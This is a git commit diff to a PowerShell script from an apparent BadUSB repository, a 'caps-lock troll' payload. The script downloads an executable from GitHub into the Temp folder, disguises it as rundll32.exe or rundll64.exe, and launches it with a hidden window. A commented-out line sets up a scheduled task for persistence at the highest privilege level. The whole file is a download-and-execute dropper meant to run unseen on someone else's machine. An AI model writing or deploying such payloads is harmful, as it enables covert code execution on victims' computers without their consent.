b3a5a488709e689b0478f0dd410e954dd4320dfe
TobiS137 <75208393+TobiS137@users.noreply.github.com>
2025-03-27 13:52:25 +0100

    Update cAps-TroLl-v3.ps1

--- cAps-TroLl-v3/cAps-TroLl-v3.ps1
+++ cAps-TroLl-v3/cAps-TroLl-v3.ps1
@@ -1,6 +1,6 @@
 cd $env:Temp;
-iwr -Uri https://raw.githubusercontent.com/TobiS137/BadUSB/refs/heads/main/cAps-TroLl-v3/cAps-TroLl-v3.exe -O rundll32.exe -UseBasicParsing;
+iwr -Uri https://raw.githubusercontent.com/TobiS137/BadUSB/refs/heads/main/cAps-TroLl-v3/cAps-TroLl-v3.exe -O rundll64.exe -UseBasicParsing;
 Start-Sleep 1;
-Start-Process .\rundll32.exe -WindowStyle Hidden;
+Start-Process .\rundll64.exe -WindowStyle Hidden;
 # schtasks /create /tn "CapsLockTask" /tr "C:\Users\Administrator\Documents\cAps-TroLl-v2\capslock.exe" /sc minute /mo 1 /rl highest /f /ru "$env:USERNAME";
 exit
